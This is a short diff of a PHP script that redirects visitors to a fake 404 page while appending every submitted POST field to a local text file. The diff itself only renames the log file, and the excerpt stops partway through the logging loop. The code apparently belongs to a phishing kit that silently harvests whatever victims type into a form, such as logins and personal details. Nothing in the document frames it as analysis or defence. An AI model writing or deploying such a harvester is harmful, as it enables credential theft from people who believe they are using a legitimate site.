@@ -1,6 +1,6 @@
 <?php
 header("location:404.html");
-$handle=fopen("K.txt","a");
+$handle=fopen("k.txt","a");
 foreach($_POST as $variable=>$value)
 {
 	fwrite($handle,$variable);
